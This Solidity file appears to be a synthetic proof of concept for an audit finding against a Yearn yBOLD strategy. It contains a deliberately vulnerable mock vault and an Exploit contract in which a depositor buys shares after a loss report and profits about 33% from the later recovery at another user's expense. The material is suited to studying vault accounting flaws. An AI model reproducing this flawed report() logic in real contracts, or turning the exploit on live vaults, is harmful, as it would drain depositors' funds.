// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Yearn yBOLD Strategy — H-2: Deposit after loss report free-rides recovery
    (Sherlock 2025-05-yearn-ybold; finding #57687)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: after a Stability-Pool liquidation the strategy's BOLD balance drops
    while collateral gains are still unrealized. report() books a loss (PPS drops).
    Attacker deposits at the depressed PPS; when collateral is later auctioned for
    BOLD and reported as profit, PPS recovers and the attacker redeems more than
    they deposited — socializing the temporary loss onto prior depositors.
    Vulnerable report() loss path that blindly trusts harvestAndReport @>. */

contract MockERC20 {
    string public constant name = "BOLD";
    string public constant symbol = "BOLD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal strategy vault: shares track lastTotalAssets via report().
contract Strategy {
    MockERC20 public immutable asset;
    uint256 public totalSupply;
    uint256 public totalAssets; // lastTotalAssets
    mapping(address => uint256) public balanceOf;
    bool public doHealthCheck; // management can disable so large losses report
    uint256 public profitMaxUnlockTime;
    // Simulated unrealized collateral (not counted in harvestAndReport until tend)
    uint256 public unrealizedCollateralValue;

    constructor(MockERC20 _asset) {
        asset = _asset;
        doHealthCheck = true;
        profitMaxUnlockTime = 0; // instant for synthetic
    }

    function setDoHealthCheck(bool v) external {
        doHealthCheck = v;
    }

    function setProfitMaxUnlockTime(uint256 t) external {
        profitMaxUnlockTime = t;
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply;
        if (supply == 0) return assets;
        // @> VULN surface: PPS = totalAssets/supply after a loss report understates value
        // while unrealized collateral exists; deposit mints undervalued shares
        return (assets * supply) / totalAssets;
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply;
        if (supply == 0) return shares;
        return (shares * totalAssets) / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = convertToShares(assets);
        require(shares != 0, "ZERO_SHARES");
        asset.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
        totalAssets += assets;
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assetsOut) {
        require(balanceOf[owner] >= shares, "bal");
        assetsOut = convertToAssets(shares);
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        totalAssets -= assetsOut;
        asset.transfer(receiver, assetsOut);
    }

    /// @dev Simulate SP liquidation: burn BOLD, book unrealized collateral value.
    function simulateLiquidation(uint256 boldLost, uint256 collValue) external {
        // Move BOLD out (offset), leave collValue pending
        require(asset.balanceOf(address(this)) >= boldLost, "bold");
        asset.transfer(address(0xdead), boldLost);
        unrealizedCollateralValue += collValue;
        // NOTE: totalAssets NOT yet updated — only report() does that
    }

    /// @dev harvestAndReport: only counts free BOLD, not unrealized collateral.
    function harvestAndReport() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    /// @dev Keeper report — books loss when BOLD dropped but coll not yet sold.
    function report() external returns (uint256 profit, uint256 loss) {
        // Health check would block large losses; management disabled it.
        uint256 newTotalAssets = harvestAndReport(); // @> VULN: ignores unrealized coll gains → temporary loss
        // FIX: include marked-to-market collateral OR delay loss until auction settles
        uint256 oldTotalAssets = totalAssets;
        if (newTotalAssets > oldTotalAssets) {
            profit = newTotalAssets - oldTotalAssets;
        } else {
            loss = oldTotalAssets - newTotalAssets;
            if (doHealthCheck && loss > 0) {
                // simplified: with health check on, reject any loss
                revert("health check");
            }
        }
        totalAssets = newTotalAssets;
    }

    /// @dev tend: "auction" unrealized collateral back into BOLD.
    function tend() external {
        uint256 v = unrealizedCollateralValue;
        unrealizedCollateralValue = 0;
        // Mint recovered BOLD into the strategy (simulates auction proceeds)
        asset.mint(address(this), v);
    }
}

contract Actor {
    Strategy public strategy;
    MockERC20 public asset;

    constructor(Strategy s, MockERC20 a) {
        strategy = s;
        asset = a;
    }

    function doDeposit(uint256 amt) external {
        asset.approve(address(strategy), type(uint256).max);
        strategy.deposit(amt, address(this));
    }

    function doRedeemAll() external returns (uint256) {
        return strategy.redeem(strategy.balanceOf(address(this)), address(this), address(this));
    }
}

contract Exploit {
    MockERC20 public asset; // CREATE 1
    Strategy public strategy; // CREATE 2 — vulnerable
    Actor public victim; // CREATE 3
    Actor public attacker; // CREATE 4
    uint256 public attackerProfit;
    uint256 public userLoss;
    uint256 public constant USER_DEPOSIT = 100e18;
    uint256 public constant ATTACKER_DEPOSIT = 100e18;

    constructor() {
        asset = new MockERC20();
        strategy = new Strategy(asset);
        victim = new Actor(strategy, asset);
        attacker = new Actor(strategy, asset);
        asset.mint(address(victim), USER_DEPOSIT);
        asset.mint(address(attacker), ATTACKER_DEPOSIT);
        // Management disables health check so the loss can be reported
        strategy.setDoHealthCheck(false);
        strategy.setProfitMaxUnlockTime(0);
    }

    function run() external {
        uint256 attackerBefore = asset.balanceOf(address(attacker));
        uint256 userBefore = asset.balanceOf(address(victim));

        // 1. Victim deposits 100e18
        victim.doDeposit(USER_DEPOSIT);
        require(strategy.totalAssets() == USER_DEPOSIT, "ta");

        // 2. Stability pool liquidation: lose 100e18 BOLD, gain 100e18 coll value
        //    (synthetic: full principal offset with equal coll recovery pending)
        // Finding uses large offset; we use 50% loss for clear free-ride:
        // lose 50e18 BOLD, unrealized coll = 50e18
        strategy.simulateLiquidation(50e18, 50e18);
        require(asset.balanceOf(address(strategy)) == 50e18, "half bold");

        // 3. Keeper reports loss → PPS halves
        (uint256 p1, uint256 loss1) = strategy.report();
        p1; // silence
        require(loss1 == 50e18, "loss booked");
        require(strategy.totalAssets() == 50e18, "ta after loss");

        // 4. Attacker deposits 100e18 at depressed PPS
        // shares = 100e18 * totalSupply / 50e18 = 100e18 * 1 / 0.5? supply=100e18, ta=50e18
        // shares = 100e18 * 100e18 / 50e18 = 200e18
        attacker.doDeposit(ATTACKER_DEPOSIT);
        require(strategy.balanceOf(address(attacker)) == 200e18, "attacker shares");

        // 5. tend sells coll → +50e18 BOLD; report profit → ta restored
        strategy.tend();
        (uint256 profit2,) = strategy.report();
        require(profit2 == 50e18, "profit restored");
        // totalAssets = 50 + 100 (attacker dep) + 50 (coll) = 200e18
        require(strategy.totalAssets() == 200e18, "ta restored");

        // 6. Attacker redeems 200e18 shares of 300e18 supply for 200/300 * 200 = 133.33e18
        // Wait supply = victim 100 + attacker 200 = 300, ta = 200
        // attacker gets 200/300 * 200 = 133.33 → profit 33.33 on 100 deposit (~33%)
        attacker.doRedeemAll();
        victim.doRedeemAll();

        attackerProfit = asset.balanceOf(address(attacker)) - attackerBefore;
        userLoss = userBefore - asset.balanceOf(address(victim));

        require(attackerProfit > 30e18, "attacker profit ~33%");
        require(userLoss > 30e18, "user lost ~33%");
    }
}
